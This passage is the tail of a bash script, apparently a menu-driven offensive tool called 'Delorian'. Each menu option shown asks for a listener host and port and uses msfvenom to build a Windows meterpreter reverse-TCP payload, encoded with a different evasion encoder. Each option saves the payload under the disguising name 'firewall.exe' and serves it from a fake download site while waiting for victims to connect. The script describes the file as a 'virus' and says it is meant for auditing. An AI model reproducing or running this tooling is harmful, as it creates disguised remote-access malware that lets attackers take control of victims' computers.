setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|    \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/add_sub -f exe > /usr/delorian/windows/firewall.exe 
cd /
setterm -foreground green
echo "  You can edit your sites according to the company you are auditing to have better results."
echo "  Fake site: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  virus: /usr/delorian/windows/firewall.exe"
echo "  Here you can see the traffic that is happening on your server, just wait for connections."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
24)
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x64/zutto_dekiru -f exe > /usr/delorian/windows/firewall.exe 
cd /
setterm -foreground green
echo "  You can edit your sites according to the company you are auditing to have better results."
echo "  Fake site: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  virus: /usr/delorian/windows/firewall.exe"
echo "  Here you can see the traffic that is happening on your server, just wait for connections."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
25)
clear
echo ""
setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|    \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $ "  lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x64/xor_dynamic -f exe > /usr/delorian/windows/firewall.exe 
cd /
setterm -foreground green
echo "  You can edit your sites according to the company you are auditing to have better results."
echo "  Fake site: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  virus: /usr/delorian/windows/firewall.exe"
echo "  Here you can see the traffic that is happening on your server, just wait for connections."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer" 
;;
26)
clear
echo ""
setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|    \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x64/xor_context -f exe > /usr/delorian/windows/firewall.exe 
cd /
setterm -foreground green
echo "  You can edit your sites according to the company you are auditing to have better results."
echo "  Fake site: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  virus: /usr/delorian/windows/firewall.exe"
echo "  Here you can see the traffic that is happening on your server, just wait for connections."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
27)
clear
echo ""
setterm -foreground white
echo "               https://github.com/TheHorseOnFireARG/     "
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T|    \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x64/xor -f exe > /usr/delorian/windows/firewall.exe 
cd /
setterm -foreground green
echo "  You can edit your sites according to the company you are auditing to have better results."
echo "  Fake site: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  virus: /usr/delorian/windows/firewall.exe"
echo "  Here you can see the traffic that is happening on your server, just wait for connections."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer" 
;;
esac
